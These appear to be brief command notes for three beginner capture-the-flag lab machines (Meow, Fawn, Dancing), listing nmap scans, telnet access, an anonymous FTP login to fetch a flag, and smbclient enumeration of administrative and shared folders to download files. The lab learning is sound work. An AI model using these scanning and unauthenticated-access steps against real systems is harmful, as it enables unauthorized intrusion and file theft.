## Meow challenge:
- sudo openvpn {filename.opvn}
- ping {target_ip}
- sudo nmap -sV 10.129.239.25
- telnet {target_ip}


## Fawn challenge
- sudo nmap {target_ip}
- sudo nmap -sV {target_ip}
- sudo apt install ftp -y
- ftp -h
- ftp {target_ip}
  `username: anonymous
  `password:
- ftp> help
- ftp> ls
- ftp> get flag.txt
- ftp> bye
- cat flag.txt


## Dancing challenge:
- sudo nmap -sV {target_ip}
- sudo apt-get install smbclient
- smbclient -L 10.129.239.172
- smbclient \\\\10.129.239.172\\ADMIN$
- smbclient \\\\10.129.239.172\\C$
- smbclient \\\\10.129.239.172\\WorkShares
- smb: \> help
- smb: \> ls
- smb: \> cd Amy.J
- smb: \Amy.J\> ls
- smb: \Amy.J\> get worknotes.txt
- smb: \Amy.J\> cd ..
- smb: \> cd James.P
- smb: \James.P\> ls
- smb: \James.P\> get flag.txt
- cat flag.txt
